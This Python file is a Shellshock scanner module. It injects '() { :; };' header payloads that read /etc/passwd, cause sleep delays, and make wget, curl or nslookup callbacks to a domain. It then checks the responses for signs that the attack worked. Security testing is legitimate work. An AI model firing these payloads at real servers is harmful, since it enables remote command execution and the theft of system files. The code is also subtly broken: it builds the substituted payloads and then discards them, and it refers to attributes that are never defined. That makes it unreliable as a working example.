
import pluck.settings as settings
import random, string
from pluck.module import ActiveModule



class ShellShockTester(ActiveModule):
    def __init__(self, request):
        super().__init__(request)
        self.name = "Shell Shock Tester"
        self.test_parameters = []
        self.injection_points = ["headers"]
        self.excluded_parameters = []
        self.generator = None

        self.unique_string = self.generate_unique_string()
        self.success_strings = []
        
    def analyze_response(self, response):
        # check root in passwd
        for message in self.success_strings:
            if message.lower() in response.body.lower():
                return True

        # check sleep time
        if response.elapsed_time > self.generator.sleep_timeout:
            return True
        # check unique string in result
        
        if self.generator.unique_string in response.body:
            return True
        




        return False

    def generate_unique_string(self, length=16):
            return ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(length))


    def generate_payloads(self):
        shock_templates = [ 
            "() { :; }; PAYLOAD",
            "() { nothing;}; PAYLOAD"
            ]
        
        payloads = [
            '/bin/cat /etc/passwd',
            'echo \"UNIQUE\"',
            'sleep TIMEOUT',
            'wget http://DOMAIN/UNIQUE',
            'curl http://DOMAIN/UNIQUE',
            'nslookup DOMAIN'
        ]

        crafted_payloads = [p.replace('TIMEOUT', str(self.sleep_timeout)).replace("DOMAIN",self.domain).replace("UNIQUE", self.unique_string) for p in payloads]
        
        self.success_strings.append("root:x:0:0:root:/root")



        return [t.replace("PAYLOAD",p) for t in shock_templates for p in payloads]


    def run(self):
         # Generate payloads
        print(f"[*] Executing the {self.name} module")
        payloads = self.generate_payloads()

        generated_requests = self.generate_requests(payloads)

        #print("Generated Requests Count: "+ str(len(generated_requests)))
        self.send_requests(generated_requests)

